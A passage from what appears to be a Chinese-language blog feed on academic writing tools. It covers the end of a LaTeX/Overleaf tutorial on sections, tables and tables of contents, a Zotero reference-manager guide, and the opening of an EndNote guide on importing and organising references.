class="hljs-keyword">\documentclass</span>&#123;article&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\begin</span>&#123;abstract&#125;<br>This is a simple paragraph at the beginning of the <br>document. A brief introduction about the main subject.<br><span class="hljs-keyword">\end</span>&#123;abstract&#125;<br><br>After our abstract we can begin the first paragraph, then press ``enter&#x27;&#x27; twice to start the second one.<br><br>This line will start a second paragraph.<br><br>I will start the third paragraph and then add <span class="hljs-keyword">\\</span> a manual line break which causes this text to start on a new line but remains part of the same paragraph. Alternatively, I can use the <span class="hljs-keyword">\verb</span>|<span class="hljs-string">\newline</span>|<span class="hljs-keyword">\newline</span> command to start a new line, which is also part of the same paragraph.<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748203.png"alt="image-20240330172153885" /><figcaption aria-hidden="true">image-20240330172153885</figcaption></figure><p>注意不要使用多个 <code>\\</code> 或 <code>\newlines</code> 来 “模拟”段落之间具有较大间距，因为这可能会干扰 LATEX的排版算法。推荐的方法是继续使用双空行来创建没有任何 <code>\\</code>的新段落，然后将 <code>\usepackage&#123;parskip&#125;</code> 添加到序言中。</p><p>你可以在这篇有关 <ahref="https://link.zhihu.com/?target=https%3A//www.overleaf.com/learn/Paragraphs_and_new_lines">段落和换行</a>的文章中找到更多信息。</p><h2 id="章节">9.3 章节</h2><p>用来组织文档的命令因文档类型而异，最简单的组织形式是分节，它对所有文档格式均可用。注意：<code>\part</code>和 <code>\chapter</code> 仅在 report 和 book 类中可用。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\documentclass</span>&#123;book&#125;<br><span class="hljs-keyword">\begin</span>&#123;document&#125;<br><br><span class="hljs-keyword">\chapter</span>&#123;First Chapter&#125;<br><br><span class="hljs-keyword">\section</span>&#123;Introduction&#125;<br><br>This is the first section.<br><br>Lorem  ipsum  dolor  sit  amet,  consectetuer  adipiscing  <br>elit. Etiam  lobortisfacilisis sem.  Nullam nec mi et <br>neque pharetra sollicitudin.  Praesent imperdietmi nec ante. <br>Donec ullamcorper, felis non sodales...<br><br><span class="hljs-keyword">\section</span>&#123;Second Section&#125;<br><br>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.  <br>Etiam lobortis facilisissem.  Nullam nec mi et neque pharetra <br>sollicitudin.  Praesent imperdiet mi necante...<br><br><span class="hljs-keyword">\subsection</span>&#123;First Subsection&#125;<br>Praesent imperdietmi nec ante. Donec ullamcorper, felis non sodales...<br><br><span class="hljs-keyword">\section</span>*&#123;Unnumbered Section&#125;<br>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.  <br>Etiam lobortis facilisissem...<br><span class="hljs-keyword">\end</span>&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748204.png"alt="image-20240330173328298" /><figcaption aria-hidden="true">image-20240330173328298</figcaption></figure><p>命令 <code>\section&#123;&#125;</code>标记一个新分节的开始，在大括号内设置标题。分节编号是自动的，也可以通过在命令中加一个* 来禁用编号，像这样：<code>\section*&#123;&#125;</code>。我们也可以有<code>\subsection&#123;&#125;</code>，甚至<code>\subsubsection&#123;&#125;</code>。下面列出了基本的标题深度级别：</p><table><thead><tr class="header"><th>深度</th><th>标记</th></tr></thead><tbody><tr class="odd"><td>-1</td><td></td></tr><tr class="even"><td>0</td><td></td></tr><tr class="odd"><td>1</td><td></td></tr><tr class="even"><td>2</td><td></td></tr><tr class="odd"><td>3</td><td></td></tr><tr class="even"><td>4</td><td></td></tr><tr class="odd"><td>5</td><td></td></tr></tbody></table><p>有关文档结构命令的更多信息， 请访问<ahref="https://cn.overleaf.com/learn/latex/Sections_and_chapters">章节</a>Overleaf文章。</p><h2 id="表格">9.4 表格</h2><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs latex"><span class="hljs-keyword">\begin</span> &#123; center &#125; <br><span class="hljs-keyword">\begin</span> &#123; tabular &#125;&#123; ccc &#125; <br> cell1 <span class="hljs-built_in">&amp;</span> cell2 <span class="hljs-built_in">&amp;</span> cell3 <span class="hljs-keyword">\\</span>  <br> cell4 <span class="hljs-built_in">&amp;</span> cell5 <span class="hljs-built_in">&amp;</span> cell6 <span class="hljs-keyword">\\</span>   <br> cell7 <span class="hljs-built_in">&amp;</span> cell8 <span class="hljs-built_in">&amp;</span> cell9    <br> <span class="hljs-keyword">\end</span> &#123; tabular &#125; <br><span class="hljs-keyword">\end</span> &#123; center &#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748205.png"alt="image-20240330173631200" /><figcaption aria-hidden="true">image-20240330173631200</figcaption></figure><p><code>tabular</code> 环境是创建表的默认 LATEX方法。你必须为此环境指定一个参数，这个例子里是 {c c c}。这告诉LATEX，表格将有三列，每列中的文本必须居中。你还可以使用 <code>r</code>将文本向右对齐，使用 <code>l</code> 进行左对齐。符号 <code>&amp;</code>是分隔符，每行中的分隔符必须始终少于列数。要转到表格的下一行，需要使用换行命令<code>\\</code>。我们将整个表包装在 <code>center</code>环境中，以让它出现在页面的中心。</p><h3 id="添加边框">9.4.1 添加边框</h3><p><code>tabular</code> 环境很灵活，你可以在每列之间放置分隔线。</p><ul><li><code>&#123;|c|c|c|&#125;</code>：这声明表中将会有由垂直线分隔的三列。<code>|</code>符号指定这些列应由垂直线分隔。</li><li><code>\hline</code>：这条命令将插入一条水平线。示例中，我们在表格的顶部和底部加入了水平线。<code>\hline</code>的使用次数没有限制。</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">\begin&#123;center&#125;<br>\begin&#123;tabular&#125;&#123; |c|c|c| &#125;<br> \hline<br> cell1 &amp; cell2 &amp; cell3 \\<br> cell4 &amp; cell5 &amp; cell6 \\<br> cell7 &amp; cell8 &amp; cell9 \\<br> \hline<br>\end&#123;tabular&#125;<br>\end&#123;center&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748206.png"alt="image-20240330173920181" /><figcaption aria-hidden="true">image-20240330173920181</figcaption></figure><p>在 LATEX 中创建表比较麻烦，可以从 <ahref="https://link.zhihu.com/?target=https%3A//www.tablesgenerator.com/">TablesGenerator.com</a>这样的在线工具导出表格的 LATEX 代码。</p><h3 id="标题标签和引用-1">9.4.2 标题、标签和引用</h3><p>你可以使用与图片几乎相同的方式来为表格添加标题、标签和引用。唯一的区别是，使用<code>table</code> 环境代替了 <code>figure</code> 环境。</p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs latex">Table <span class="hljs-keyword">\ref</span>&#123;table:data&#125; shows how to add a table caption and reference a table.<br><span class="hljs-keyword">\begin</span>&#123;table&#125;[h!]<br><span class="hljs-keyword">\centering</span><br><span class="hljs-keyword">\begin</span>&#123;tabular&#125;&#123;||c c c c||&#125; <br> <span class="hljs-keyword">\hline</span><br> Col1 <span class="hljs-built_in">&amp;</span> Col2 <span class="hljs-built_in">&amp;</span> Col2 <span class="hljs-built_in">&amp;</span> Col3 <span class="hljs-keyword">\\</span> [0.5ex] <br> <span class="hljs-keyword">\hline</span><span class="hljs-keyword">\hline</span><br> 1 <span class="hljs-built_in">&amp;</span> 6 <span class="hljs-built_in">&amp;</span> 87837 <span class="hljs-built_in">&amp;</span> 787 <span class="hljs-keyword">\\</span> <br> 2 <span class="hljs-built_in">&amp;</span> 7 <span class="hljs-built_in">&amp;</span> 78 <span class="hljs-built_in">&amp;</span> 5415 <span class="hljs-keyword">\\</span><br> 3 <span class="hljs-built_in">&amp;</span> 545 <span class="hljs-built_in">&amp;</span> 778 <span class="hljs-built_in">&amp;</span> 7507 <span class="hljs-keyword">\\</span><br> 4 <span class="hljs-built_in">&amp;</span> 545 <span class="hljs-built_in">&amp;</span> 18744 <span class="hljs-built_in">&amp;</span> 7560 <span class="hljs-keyword">\\</span><br> 5 <span class="hljs-built_in">&amp;</span> 88 <span class="hljs-built_in">&amp;</span> 788 <span class="hljs-built_in">&amp;</span> 6344 <span class="hljs-keyword">\\</span> [1ex] <br> <span class="hljs-keyword">\hline</span><br><span class="hljs-keyword">\end</span>&#123;tabular&#125;<br><span class="hljs-keyword">\caption</span>&#123;Table to test captions and labels.&#125;<br><span class="hljs-keyword">\label</span>&#123;table:data&#125;<br><span class="hljs-keyword">\end</span>&#123;table&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748207.png"alt="image-20240330174401136" /><figcaption aria-hidden="true">image-20240330174401136</figcaption></figure><h2 id="添加目录">9.5 添加目录</h2><p>创建目录很简单，使用 <code>\tableofcontents</code>即可完成所有工作：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs text">\documentclass&#123;article&#125;<br>\usepackage[utf8]&#123;inputenc&#125;<br><br>\title&#123;Sections and Chapters&#125;<br>\author&#123;Gubert Farnsworth&#125;<br>\date&#123; &#125;<br><br>\begin&#123;document&#125;<br><br>\maketitle<br><br>\tableofcontents<br><br>\section&#123;Introduction&#125;<br><br>This is the first section.<br><br>Lorem  ipsum  dolor  sit  amet,  consectetuer  adipiscing<br>elit.   Etiam  lobortisfacilisis sem.  Nullam nec mi et<br>neque pharetra sollicitudin.  Praesent imperdietmi nec ante.<br>Donec ullamcorper, felis non sodales...<br><br>\addcontentsline&#123;toc&#125;&#123;section&#125;&#123;Unnumbered Section&#125;<br>\section*&#123;Unnumbered Section&#125;<br><br>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.<br>Etiam lobortis facilisissem.  Nullam nec mi et neque pharetra<br>sollicitudin.  Praesent imperdiet mi necante...<br><br>\section&#123;Second Section&#125;<br><br>Lorem ipsum dolor sit amet, consectetuer adipiscing elit.<br>Etiam lobortis facilisissem.  Nullam nec mi et neque pharetra<br>sollicitudin.  Praesent imperdiet mi necante...<br><br>\end&#123;document&#125;<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403301748208.png"alt="image-20240330174517850" /><figcaption aria-hidden="true">image-20240330174517850</figcaption></figure><p>section/subsection/chapter将会自动加入目录当中。如果需要加入手动添加目录条目，比如需要将非编号的section 加入目录，需要使用<code>\addcontentsline</code>，像示例中那样。</p><h2 id="参考文献">9.6 参考文献</h2><ul><li>创建参考书目数据库。该文件应具有.bib扩展名，如mybibliography.bib.</li><li>编辑所需参考文献至该文件</li><li>在文档中引用参考文献</li></ul><h1 id="下载">10. 下载</h1><p>步骤：<code>Menu→Download</code></p><p><strong>参考资料：</strong></p><ol type="1"><li>Learn LaTeX in 30minutes：https://cn.overleaf.com/learn/latex/Learn_LaTeX_in_30_minutes</li><li>Overleaf 指南：30 分钟 LaTeX入门：https://zhuanlan.zhihu.com/p/513218186</li><li>overleaf参考文献引用，创建引用目录.bib文件,在文档中引用参考文献，生成参考文献列表：https://developer.aliyun.com/article/1346852</li></ol>]]></content>
    
    
    <categories>
      
      <category>论文写作</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Zotero</title>
    <link href="/2024/03/29/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/Zotero/"/>
    <url>/2024/03/29/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/Zotero/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">0. 简介</h1><h2 id="功能">0.1 功能</h2><p>Zotero是一个<strong>文献管理</strong>软件。它旨在<strong>存储、管理和引用</strong>参考书目，例如书籍和文章。在Zotero中，这些引用中的每一个都构成一个<strong>条目</strong>。更广泛地说，Zotero是收集和组织研究信息和资源的强大工具。</p><ul><li>浏览器快速抓取文献至Zotero</li><li>清晰明了的分层管理及标签分类</li><li>写作时方便快速的插入引文</li></ul><h2 id="条目类型">0.2 条目类型</h2><p>每个条目都包含不同的元数据，具体取决于它的类型。条目可以是从书籍、文章和报告到网页、艺术品、电影、信件、手稿、录音、账单、案例或法规等的所有内容。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209373.png"alt="image-20240329105929705" /><figcaption aria-hidden="true">image-20240329105929705</figcaption></figure><h2 id="条目信息">0.3 条目信息</h2><p>条目出现在 Zotero的中间区域。当前选中条目的元数据显示在右侧窗格，包括标题、创作者、出版商、日期、页码以及引用该条目所需的任何其他数据。</p><h2 id="image-202403291101497010.4-安装"><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209374.png"alt="image-20240329110149701" />0.4 安装</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209375.png"alt="image-20240329105151363" /><figcaption aria-hidden="true">image-20240329105151363</figcaption></figure><ul><li>Zotero 6 for Windows</li><li>Zotero Connector：Zotero相较于其他文献管理软件的一大优势就是可以直接从网页中抓取元数据并存入数据库，这个过程通过浏览器插件Zotero Connector 实现。</li></ul><h1 id="管理文献">1. 管理文献</h1><h2 id="文献分类">1.1 文献分类</h2><p>左侧窗格的 <code>我的文库</code>中包含个人账户下的的所有条目。右键单击 <code>我的文库</code> 或单击新建分类（按钮在左窗格上方）创建一个新分类，即一个用于收纳文献条目的文件夹，其中可以放置特定主题相关的条目。将分类想象为音乐播放器中的播放列表：分类中的条目是文库中条目的一个“链接”。同一条目可以同时属于多个分类。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209376.png"alt="image-20240329110545506" /><figcaption aria-hidden="true">image-20240329110545506</figcaption></figure><h2 id="标签">1.2 标签</h2><p>可以为条目分配<strong>标签</strong>。标签由用户命名。可以根据需要为条目分配任意数量的标签。使用左侧窗格底部的标签选择器或通过右侧窗格中任何条目的标签选项卡添加或删除标签。最多可以为6个标签分配<strong>颜色</strong>。彩色标签在条目列表中显示，并且可以使用键盘上的数字键快速添加或删除。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209378.png"alt="image-20240329111206194" /><figcaption aria-hidden="true">image-20240329111206194</figcaption></figure><h2 id="搜索">1.3 搜索</h2><p>快速搜索显示元数据、标签或全文内容与搜索词匹配的条目。单击搜索框左侧的放大镜图标将打开“高级搜索”窗口，允许进行更复杂或更具体的搜索。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209379.png"alt="image-20240329111353404" /><figcaption aria-hidden="true">image-20240329111353404</figcaption></figure><h2 id="保存的搜索">1.4 保存的搜索</h2><p><strong>高级搜索</strong>可以保存在左窗格中。看起来类似于上面所说的分类，但其中的条目会根据搜索条件自动更新。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209380.png"alt="image-20240329111614581" /><figcaption aria-hidden="true">image-20240329111614581</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209381.png"alt="image-20240329111650492" /><figcaption aria-hidden="true">image-20240329111650492</figcaption></figure><h1 id="收集文献">2. 收集文献</h1><h2 id="附件">2.1 附件</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209382.png"alt="image-20240329111833134" /><figcaption aria-hidden="true">image-20240329111833134</figcaption></figure><p>每个条目可以附有笔记、文件和链接。这些附件显示在其父项下方。通过单击其父项旁边的箭头，可以显示或隐藏附件。要全部显示或隐藏，快捷键为<code>+</code> 与 <code>-</code>。</p><h2 id="笔记">2.2 笔记</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209383.png"alt="image-20240329112032930" /><figcaption aria-hidden="true">image-20240329112032930</figcaption></figure><p>富文本笔记可以附加到任何条目。可以在右侧窗格或独立窗口中进行编辑。单击工具栏中的新建笔记按钮以创建笔记。</p><h2 id="文件">2.3 文件</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209384.png"alt="image-20240329112706348" /><figcaption aria-hidden="true">image-20240329112706348</figcaption></figure><p>任何类型的文件都可以附加到条目上。使用 Zotero工具栏中的添加附件（回形针）按钮，通过右键单击现有条目或拖放来附加文件。或者，文件不需要附加到现有条目，它们可以直接添加到您的库中。当您使用浏览器中的Zotero 连接器导入条目时，也可以自动下载文件。</p><h2 id="链接和快照">2.4 链接和快照</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209385.png"alt="image-20240329112900829" /><figcaption aria-hidden="true">image-20240329112900829</figcaption></figure><p>网页可以作为链接或快照附加到任何条目。Zotero可以保存网页的快照，快照是网页的本地存储副本，其状态与保存时相同。无需互联网连接即可使用快照。</p><h2 id="抓取条目">2.5 抓取条目</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209386.png"alt="image-20240329113137743" /><figcaption aria-hidden="true">image-20240329113137743</figcaption></figure><p>使用适用于 Chrome、Firefox 或 Safari 的 Zotero 连接器，可以轻松地从Internet 上的可用信息创建新条目。通过单击按钮，Zotero可以自动创建适当类型的条目并填充元数据字段，下载全文PDF（如果可用），并附加有用的链接（例如，到 PubMed条目）或补充数据文件。</p><h2 id="手动添加条目">2.6 手动添加条目</h2><p>可以通过单击 Zotero工具栏中的新条目绿色按钮并选择适当的条目类型来手动添加条目然后可以在右侧窗格中手动添加元数据。虽然您通常不应该手动添加条目，但它对于添加在线不可用的文档很有用。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209387.png"alt="image-20240329113312782" /><figcaption aria-hidden="true">image-20240329113312782</figcaption></figure><h1 id="引用">3. 引用</h1><h2 id="引用条目">3.1 引用条目</h2><p>Zotero 使用<strong>引文样式语言 (CSL)</strong>来正确格式化许多不同书目样式的引文。Zotero 支持所有主要风格（Chicago,MLA, APA, Vancouver 等）以及超过 8,000 种期刊和出版商的特定风格。</p><h2 id="word集成">3.2 Word集成</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403291209388.png"alt="image-20240329114258549" /><figcaption aria-hidden="true">image-20240329114258549</figcaption></figure><p>Zotero 的 Word、LibreOffice 和 Google Docs插件允许用户直接从他们的文字处理软件<strong>插入引文</strong>，这使得引用多个页面或来源或以其他方式自定义引用变得轻而易举。支持文本内引用、脚注和尾注。借助社区开发的插件，Zotero还可以与 LaTeX、Scrivener 和许多其他写作程序一起使用。</p><p>使用Zotero在Word中插入参考文献与EndNote有些区别，第一次插入时需要两步，分别<strong>插入引文（Citation）和参考书目（Bibliography）</strong>。</p><h1 id="插件">4. 插件</h1><p>谈到 Zotero 插件，可能指的有三种东西：</p><ul><li>安装在 Zotero 里的，用于增强 Zotero 的功能，一般大家提起<code>Zotero 插件</code> 都指的是这一类。本文档中提到的 Zotero插件都指这一种。</li><li>（不是 Zotero 插件，是浏览器插件）安装在浏览器里的 ZoteroConnecter，用于从网页上抓取文献元数据并存到 Zotero 里。</li><li>（不是 Zotero 插件，是 Word 加载项）在 Microsoft Word中的，正确称呼是 Word 加载项，用来插入引用和参考文献信息。</li></ul><p>获取插件：</p><ul><li>官方插件收录链接：<ahref="https://www.zotero.org/support/plugins">https://www.zotero.org/support/pluginsopenin new window</a></li><li>国内镜像：https://plugins.zotero-chinese.com/#/</li></ul><p><strong>参考资料：</strong></p><ol type="1"><li>Zotero 中文小组：https://zotero-zh.netlify.app/</li></ol>]]></content>
    
    
    <categories>
      
      <category>论文写作</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>EndNote</title>
    <link href="/2024/03/28/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/EndNote/"/>
    <url>/2024/03/28/%E8%AE%BA%E6%96%87%E5%86%99%E4%BD%9C/EndNote/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">0. 简介</h1><p>EndNote是一款<strong>文献管理</strong>软件，与SCI/SSCI等数据库兼容良好，于科研人员十分便利。</p><ul><li><p><strong>检索</strong></p><ul><li>建立个人文献图书馆</li><li>从数据库检索文献并快速导入至个人文献图书馆</li></ul></li><li><p><strong>管理</strong></p><ul><li>管理不同来源的中英文文献</li><li>创建组、去重、排序、分析、做阅读笔记等</li><li>帮助查找文献全文</li></ul></li><li><p><strong>写作</strong></p><ul><li>撰写论文时，快速引用相关文献</li><li>一键修改参考文献引用格式</li><li>准备投稿前，根据引文信息推荐合适期刊</li></ul></li></ul><h1 id="导入文献">1. 导入文献</h1><p>使用EndNote之前，首先需要创建个人文献库（个人图书馆），创建成功后会产出两个文件。</p><ul><li>步骤1：<code>file→New</code></li><li>步骤2：选择自定义存储位置</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532824.png"alt="image-20240328143928790" /><figcaption aria-hidden="true">image-20240328143928790</figcaption></figure><p>EndNote支持多种方式的文献导入，常用有以下几种：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532826.png"alt="image-20240328144006860" /><figcaption aria-hidden="true">image-20240328144006860</figcaption></figure><h2 id="数据库导入">1.1 数据库导入</h2><ol type="1"><li><p>在数据库中检索文献，得到检索文献列表。</p></li><li><p>勾选所需文献，在检索结果页面找到<code>Export</code>或<code>Download Citations</code>选项，中文数据库为<code>导出</code>。</p></li><li><p>选择<code>Export to EndNote</code>，或在导出的题录格式中，选择与EndNote相匹配的格式。如未显示与EndNote匹配的格式，则可选择较通用的<strong>RIS格式</strong>，并将该题录格式文件下载下来，保存至本机。</p></li><li><p>通常情况下，从外文数据库导出的题录格式为：<strong>enw格式、ris格式、ciw格式</strong>，直接双击该文件，即可直接导入EndNote。</p></li><li><p>小贴士：对于中文数据库保存下来的题录格式，通常为txt格式。则需在EndNote中选择<code>File--Import File</code>，选择该txt文件，并在<code>Import Option</code>中选择<code>EndNote Import</code>选项导入。</p></li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532827.png"alt="image-20240328144859404" /><figcaption aria-hidden="true">image-20240328144859404</figcaption></figure><h2 id="学术搜索引擎导入">1.2 学术搜索引擎导入</h2><ol type="1"><li><p>在学术搜索引擎如百度学术、谷歌学术、南科学术搜索中检索文献，得到结果列表。</p></li><li><p>以百度学术为例。检索完成，点击所需文献，在文献页面找到<code>引用</code>，导入链接选择所用文献管理软件<code>EndNote</code>。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532828.png"alt="image-20240328145125631" /><figcaption aria-hidden="true">image-20240328145125631</figcaption></figure></li><li><p>将该文献的题录信息保存至本机，为<strong>enw格式。</strong></p></li><li><p>双击该文件，即可直接导入EndNote。</p></li></ol><h2 id="本地pdf导入">1.3 本地PDF导入</h2><ol type="1"><li><p>保存在本地的PDF文档可快速导入至EndNote，既可以单篇导入，也可以批量导入。</p></li><li><p>单篇导入：在EndNote中选择<code>File-- Import File</code>，选择需要导入的PDF文档，并在<code>Import Options</code>中选择过滤器为<code>PDF</code>，即可完成单篇PDF导入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532829.png"alt="image-20240328145657812" /><figcaption aria-hidden="true">image-20240328145657812</figcaption></figure></li><li><p>批量导入：在EndNote中选择<code>File-- Import Folder</code>，可选择连同子文件夹一起导入，或者为该文件夹新建一个分组。EndNote通常可保留至文件夹的二级目录。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532830.png"alt="image-20240328145726931" /><figcaption aria-hidden="true">image-20240328145726931</figcaption></figure></li><li><p>小贴士：导入至EndNote的PDF文档是通过DOI号来识别的，因此，如果文档里DOI号缺失，或PDF为非矢量文档，会导致EndNote无法识别，从而在软件中显示不全。</p></li></ol><h2 id="在线检索导入">1.4 在线检索导入</h2><ol type="1"><li><p>EndNote有三种模式：本地模式、联机在线模式、本地和在线的混合模式。（新版20版本仅为混合模式）</p></li><li><p>EndNote内嵌了许多数据库，如果需要用其联机在线检索功能的话，首先需切换至在线模式，然后在左侧方的<code>Online Search</code>中选择需要检索的数据库。可点击<code>More</code>查看更多数据库。</p></li><li><p>输入检索条件，点击<code>Search</code>，进行检索。</p></li><li><p>检索完成，即可直接在EndNote中查看文献题录信息。</p></li><li><p>小贴士：EndNote支持在线检索的数据库有限，并不是所有图书馆订购的数据库都可以；检索完成后，只显示满足检索条件的结果条数，无法预览文献进行导入，因此，该方法更适用于精确检索。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532831.png"alt="image-20240328150214036" /><figcaption aria-hidden="true">image-20240328150214036</figcaption></figure></li></ol><h2 id="手动输入">1.5 手动输入</h2><ol type="1"><li><p>手动输入适用于少量文献或特殊文献，无法直接通过以上方式导入的文献。</p></li><li><p>在EndNote工具栏中找到<code>New Reference</code>，创建一条新的文献。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532832.png"alt="image-20240328150632379" /><figcaption aria-hidden="true">image-20240328150632379</figcaption></figure></li><li><p>在<code>Reference Type</code>选项中，可选择该文献类型，如标准、报告、专利、政府文件、多媒体等。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532833.png"alt="image-20240328150657500" /><figcaption aria-hidden="true">image-20240328150657500</figcaption></figure></li><li><p>输入作者时，需注意一名一行，便于EndNote识别。且通常名在前姓在后，如姓在前名在后，则需要加逗号。如：JohnSmith / Smith, John。</p></li><li><p>输入关键词时，需一词一行，便于EndNote识别。</p></li></ol><h1 id="管理文献">2. 管理文献</h1><h2 id="文献分组">2.1 文献分组</h2><p><strong>一、普通组</strong>：在EndNote界面左侧的管理区，在MyGroups中可以新建一个普通组，对文献进行划分。鼠标右键点击<code>Create Group</code>，输入名称，即可完成普通组的创建。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532834.png"alt="image-20240328151100415" /><figcaption aria-hidden="true">image-20240328151100415</figcaption></figure><p><strong>二、智能组：</strong>除了普通组以外，EndNote还支持创建智能组。通过智能组，可以对分组条件进行设置。智能组是虚拟组，其分组方式是动态的，在后续导入的文献中，EndNote会将符合该设置条件的文献自动分配至该组。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532835.png"alt="image-20240328151217959" /><figcaption aria-hidden="true">image-20240328151217959</figcaption></figure><h2 id="排序添加显示字段">2.2 排序、添加显示字段</h2><p>在EndNote主界面中，默认显示<code>Author</code>,<code>Year</code>,<code>Title</code>,<code>Journal</code>等字段，鼠标点击某一字段，可将文献列表进行升序或降序排列。鼠标右键点击字段，则可看到更多字段，如<code>Key Words</code>,<code>DOI</code>,<code>Research Notes</code>,<code>URL</code>等，勾选后即可在EndNote主界面中显示。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202403281532836.png"alt="image-20240328151545992" /><figcaption aria-hidden="true">image-20240328151545992</figcaption></figure><h2 id="利用endnote下载全文">2.3 利用EndNote下载全文</h2><p>如果图书馆订购了该文献，则在校园网IP范围内可以通过EndNote来下载文献全文。选中需要下载的文献，鼠标右键点击<code>Find Full 